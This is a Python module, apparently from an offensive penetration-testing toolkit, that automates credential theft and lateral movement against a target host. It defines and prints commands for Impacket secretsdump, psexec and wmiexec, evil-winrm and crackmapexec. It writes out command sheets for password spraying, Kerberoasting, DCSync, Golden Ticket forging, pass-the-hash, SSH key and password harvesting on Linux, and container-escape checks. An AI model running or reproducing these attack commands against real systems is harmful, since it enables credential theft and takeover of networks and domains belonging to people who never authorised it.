"""
Credential Access Module
Handles credential theft and lateral movement
"""

import sys
from pathlib import Path

# Add configs directory to path for config import
TOOLKIT_DIR = Path(__file__).parent.parent.parent.absolute()
sys.path.insert(0, str(TOOLKIT_DIR / "configs"))

try:
    import config
except ImportError:
    # Fallback config values if import fails
    class config:
        DEFAULT_USERNAME = "administrator"
        DEFAULT_DOMAIN = "domain"
        ATTACKER_IP = "127.0.0.1"

from core.utils.output import print_colored

def run_credential_access(target: str, tool_executor, script_gen):
    """Execute credential access and lateral movement phase"""
    print_colored(f"🧠 Running Credential Access / Lateral Movement for: {target}", "GREEN", True)
    print()
    
    # Get configuration values with fallbacks
    default_username = getattr(config, 'DEFAULT_USERNAME', 'administrator')
    default_domain = getattr(config, 'DEFAULT_DOMAIN', 'domain')
    
    # Credential access tools
    cred_tools = {
        "impacket_secretsdump": {
            "command": ["secretsdump.py", f"{target}/{default_username}", "-just-dc"],
            "description": "Extract domain credentials",
            "requires_creds": True
        },
        "impacket_wmiexec": {
            "command": ["wmiexec.py", f"{default_username}@{target}"],
            "description": "WMI command execution",
            "requires_creds": True
        },
        "impacket_psexec": {
            "command": ["psexec.py", f"{default_username}@{target}"],
            "description": "SMB command execution", 
            "requires_creds": True
        },
        "evil_winrm": {
            "command": ["evil-winrm", "-i", target, "-u", default_username],
            "description": "WinRM shell access",
            "requires_creds": True
        }
    }
    
    print_colored("📋 Credential Access Tools Available:", "BLUE")
    
    for tool_name, tool_config in cred_tools.items():
        if tool_executor.check_tool(tool_name.split('_')[0]):
            print_colored(f"✅ {tool_name}: {tool_config['description']}", "GREEN")
        else:
            print_colored(f"❌ {tool_name}: Not installed", "RED")
    
    print()
    print_colored("💡 Manual Commands for Credential Access:", "YELLOW")
    print(f"  • secretsdump.py DOMAIN/user:password@{target}")
    print(f"  • wmiexec.py DOMAIN/user:password@{target}")
    print(f"  • psexec.py DOMAIN/user:password@{target}")
    print(f"  • evil-winrm -i {target} -u user -p password")
    print(f"  • crackmapexec smb {target} -u user -p password --shares")
    print(f"  • crackmapexec smb {target} -u user -p password --sam")
    
    # Generate credential access scripts
    generate_lateral_movement_scripts(target, script_gen)

def generate_lateral_movement_scripts(target: str, script_gen):
    """Generate lateral movement and credential access scripts"""
    # Get configuration values with fallbacks
    default_username = getattr(config, 'DEFAULT_USERNAME', 'administrator')
    default_domain = getattr(config, 'DEFAULT_DOMAIN', 'domain')
    
    # Windows lateral movement script
    windows_lat_content = f"""# Windows Lateral Movement Commands for {target}

# Password spraying
crackmapexec smb {target} -u users.txt -p passwords.txt --continue-on-success
crackmapexec winrm {target} -u users.txt -p passwords.txt --continue-on-success

# Kerberoasting
GetUserSPNs.py {default_domain}/{default_username}:password -dc-ip {target} -request

# ASREPRoasting
GetNPUsers.py {default_domain}/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt

# DCSync
secretsdump.py {default_domain}/{default_username}:password@{target} -just-dc-ntlm

# Golden Ticket
ticketer.py -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain {default_domain} {default_username}

# Pass-the-Hash
wmiexec.py -hashes LMHASH:NTHASH {default_username}@{target}
psexec.py -hashes LMHASH:NTHASH {default_username}@{target}

# BloodHound data collection
SharpHound.exe -c All -d {default_domain}
"""
    
    # Linux lateral movement script  
    linux_lat_content = f"""# Linux Lateral Movement Commands for {target}

# SSH key harvesting
find /home -name "*.pub" -o -name "id_*" 2>/dev/null

# Sudo privilege escalation
sudo -l
find /etc/sudoers.d/ -readable 2>/dev/null

# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Credential harvesting
grep -r "password" /etc/ 2>/dev/null
find /home -name "*.bash_history" -exec grep -l "ssh\|password\|mysql" {{}} \;

# Network discovery
arp -a
ss -tuln
netstat -antup

# Container escape (if in container)
fdisk -l
mount | grep docker
ls -la /proc/1/
"""

    script_gen.safe_write("windows_lateral_movement.txt", windows_lat_content)
    script_gen.safe_write("linux_lateral_movement.txt", linux_lat_content)
    print_colored("📁 Lateral movement scripts generated", "CYAN")